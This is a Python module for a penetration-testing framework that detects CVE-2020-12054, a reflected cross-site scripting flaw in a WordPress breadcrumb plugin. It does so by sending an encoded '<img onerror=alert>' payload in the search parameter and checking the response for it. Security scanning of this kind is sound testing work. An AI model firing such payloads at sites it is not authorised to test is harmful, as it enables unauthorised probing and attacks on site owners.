#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Catch Breadcrumb plugin before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Catch Breadcrumb <1.5.4 - Cross-Site Scripting Detection',
        'description': 'WordPress Catch Breadcrumb plugin before 1.5.4 contains a reflected cross-site scripting vulnerability via the s parameter (a search query). Also affected are 16 themes if the plugin is enabled: Alchemist and Alchemist PRO, Izabel and Izabel PRO, Chique and Chique PRO, Clean Enterprise and Clean Enterprise PRO, Bold Photography PRO, Intuitive PRO, Devotepress PRO, Clean Blocks PRO, Foodoholic PRO, Catch Mag PRO, Catch Wedding PRO, and Higher Education PRO.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'wordpress', 'xss', 'wp-plugin', 'wpscan', 'catchplugins', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/30a83491-2f59-4c41-98bd-a9e6e5a609d4',
            'https://wpvulndb.com/vulnerabilities/10184',
            'https://cxsecurity.com/issue/WLB-2020040144',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-12054',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-12054',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?s=%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29%3B%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<img src=x onerror=alert(123);>', 'catch-breadcrumb',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Catch Breadcrumb <1.5.4 - Cross-Site Scripting detected",
                path='/?s=%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29%3B%3E',
            )
            return True
        return False

